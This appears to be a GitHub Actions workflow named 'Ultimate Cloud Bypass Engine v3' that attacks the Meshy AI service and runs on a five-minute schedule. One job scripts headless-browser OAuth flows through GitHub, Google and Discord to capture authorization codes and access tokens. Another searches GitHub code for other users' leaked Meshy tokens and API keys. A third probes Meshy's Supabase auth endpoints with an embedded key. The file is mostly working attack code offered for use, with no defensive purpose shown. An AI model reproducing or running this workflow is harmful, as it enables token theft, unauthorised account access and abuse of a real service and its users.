name: Ultimate Cloud Bypass Engine v3
on:
  push:
    branches: [main]
  workflow_dispatch:
  schedule:
    - cron: '*/5 * * * *'

env:
  MESHY_KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA

jobs:
  meshy_oauth_full:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install Playwright
        run: |
          npm init -y > /dev/null 2>&1
          npm install playwright > /dev/null 2>&1
          npx playwright install chromium --with-deps > /dev/null 2>&1
        timeout-minutes: 15
      - name: OAuth Full Bypass
        run: |
          node << 'NODEEOF'
          const { chromium } = require('playwright');
          const https = require('https');
          const fs = require('fs');

          const MESHY_KEY = process.env.MESHY_KEY;
          const GH_CLIENT_ID = 'Ov23lizZ7qhYafAtFjNb';

          async function fetch(url, options = {}) {
            return new Promise((resolve) => {
              const u = new URL(url);
              const req = https.request({
                hostname: u.hostname, port: 443,
                path: u.pathname + u.search,
                method: options.method || 'GET',
                headers: options.headers || {},
              }, res => {
                let d = '';
                res.on('data', c => d += c);
                res.on('end', () => resolve({ status: res.statusCode, body: d }));
              });
              req.on('error', e => resolve({ status: 0, body: e.message }));
              if (options.body) req.write(options.body);
              req.end();
            });
          }

          async function runOAuthFlow(provider, page, state) {
            const authUrl = `https://auth.meshy.ai/auth/v1/authorize?provider=${provider}&redirect_to=https://www.meshy.ai&state=${state}&response_type=code`;
            const capturedCode = [];
            const capturedTokens = [];

            page.on('response', async res => {
              const url = res.url();
              if (url.includes('auth.meshy') || url.includes('callback')) {
                try {
                  const body = await res.text();
                  if (body.includes('token') || body.includes('code') || body.includes('error') || body.includes('access_token')) {
                    capturedTokens.push({ url, body: body.substring(0, 500) });
                  }
                } catch(e) {}
              }
            });

            await page.goto(authUrl, { waitUntil: 'networkidle', timeout: 90000 });
            await page.waitForTimeout(8000);
            const currentUrl = page.url();

            if (currentUrl.includes('code=')) {
              const u = new URL(currentUrl);
              const code = u.searchParams.get('code');
              if (code) {
                capturedCode.push(code);
                console.log(`[${provider}] Got code:`, code.substring(0, 50));
                const resp = await fetch(`https://auth.meshy.ai/auth/v1/token?grant_type=pkce`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json', 'apikey': MESHY_KEY },
                  body: JSON.stringify({
                    grant_type: 'authorization_code',
                    code: code,
                    redirect_uri: 'https://www.meshy.ai',
                    client_id: MESHY_KEY,
                  })
                });
                console.log(`[${provider}] Token exchange:`, resp.status, resp.body.substring(0, 300));
                const data = JSON.parse(resp.body || '{}');
                if (data.access_token) {
                  fs.writeFileSync('oauth_success.json', JSON.stringify({
                    provider, token: data.access_token, refresh: data.refresh_token
                  }));
                  console.log(`*** ${provider.toUpperCase()} OAUTH SUCCESS ***`);
                  console.log('Token:', data.access_token.substring(0, 50));
                }
              }
            }

            if (currentUrl.includes('access_token=')) {
              const u = new URL(currentUrl);
              const token = u.searchParams.get('access_token');
              if (token) {
                fs.writeFileSync('oauth_implicit.json', JSON.stringify({ provider, token }));
                console.log(`*** ${provider.toUpperCase()} IMPLICIT SUCCESS ***`);
                console.log('Token:', token.substring(0, 50));
              }
            }

            fs.writeFileSync(`${provider}_tokens.json`, JSON.stringify(capturedTokens));
            return { url: currentUrl, code: capturedCode };
          }

          async function main() {
            console.log('=== ULTIMATE OAUTH BYPASS ===\n');

            const browser = await chromium.launch({
              headless: true,
              args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
            });

            const context = await browser.newContext({
              userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
              viewport: { width: 1280, height: 720 },
              locale: 'en-US',
            });

            const page = await context.newPage();
            const state = 'meshy' + Math.random().toString(36).substring(2, 20);

            console.log('[1] GitHub OAuth...');
            const ghResult = await runOAuthFlow('github', page, state);
            console.log('[1a] GitHub result:', ghResult.url);

            console.log('\n[2] Google OAuth...');
            const googleResult = await runOAuthFlow('google', page, state);
            console.log('[2a] Google result:', googleResult.url);

            console.log('\n[3] Discord OAuth...');
            const discordResult = await runOAuthFlow('discord', page, state);
            console.log('[3a] Discord result:', discordResult.url);

            await browser.close();
            console.log('\nDone.');
          }

          main().catch(e => { console.error('ERROR:', e.message); process.exit(1); });
          NODEEOF
      - name: Test & Report
        run: |
          echo "=== OAUTH RESULTS ==="
          for f in oauth_success.json oauth_implicit.json github_tokens.json google_tokens.json discord_tokens.json; do
            if [ -f "$f" ]; then
              echo "--- $f ---"
              cat "$f"
              echo ""
            fi
          done
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: oauth-results-$(date +%Y%m%d-%H%M%S)
          path: oauth_*.json *_tokens.json
          retention-days: 7

  github_token_hunter:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Search GitHub for Leaked Keys
        run: |
          echo "=== GITHUB TOKEN HUNTER ==="
          echo "[1] Searching for access tokens..."
          curl -s "https://api.github.com/search/code?q=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9+meshy+access_token&per_page=20" \
            -H "Authorization: Bearer $(gh auth token)" \
            -H "Accept: application/vnd.github+json" | python3 -c "
          import json,sys
          d=json.load(sys.stdin)
          print(f'Total: {d.get(\"total_count\",0)}')
          for i in d.get('items',[])[:10]:
              print(f'  {i[\"repository\"][\"full_name\"]}: {i[\"path\"]}')
          " 2>/dev/null || echo "No results"
          echo ""
          echo "[2] Searching for msy_ API keys..."
          curl -s "https://api.github.com/search/code?q=msy_+meshy+ai&per_page=20" \
            -H "Authorization: Bearer $(gh auth token)" \
            -H "Accept: application/vnd.github+json" | python3 -c "
          import json,sys
          d=json.load(sys.stdin)
          print(f'Total: {d.get(\"total_count\",0)}')
          for i in d.get('items',[])[:10]:
              print(f'  {i[\"repository\"][\"full_name\"]}: {i[\"path\"]}')
          " 2>/dev/null || echo "No results"
          echo ""
          echo "[3] Searching for Bearer tokens..."
          curl -s "https://api.github.com/search/code?q=Bearer+eyJh+meshy&per_page=20" \
            -H "Authorization: Bearer $(gh auth token)" \
            -H "Accept: application/vnd.github+json" | python3 -c "
          import json,sys
          d=json.load(sys.stdin)
          print(f'Total: {d.get(\"total_count\",0)}')
          for i in d.get('items',[])[:10]:
              print(f'  {i[\"repository\"][\"full_name\"]}: {i[\"path\"]}')
          " 2>/dev/null || echo "No results"
          echo ""
          echo "[4] Top repos with Meshy code..."
          curl -s "https://api.github.com/search/repositories?q=meshy.ai+3d&sort=stars&per_page=10" \
            -H "Authorization: Bearer $(gh auth token)" \
            -H "Accept: application/vnd.github+json" | python3 -c "
          import json,sys
          d=json.load(sys.stdin)
          for i in d.get('items',[])[:10]:
              print(f'  [{i[\"stargazers_count\"]} stars] {i[\"full_name\"]}: {i[\"description\"]}')
          " 2>/dev/null || echo "No repos"

  supabase_internal:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Supabase Internal RE
        run: |
          KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA"
          echo "=== SUPABASE INTERNAL RE ==="
          echo "[1] Settings..."
          curl -s "https://auth.meshy.ai/auth/v1/settings" -H "apikey: $KEY"
          echo ""
          echo "[2] Configuration..."
          curl -s "https://auth.meshy.ai/auth/v1/configuration" -H "apikey: $KEY"
          echo ""
          echo "[3] Project info..."
          curl -s "https://auth.meshy.ai/auth/v1/project" -H "apikey: $KEY"
          echo ""
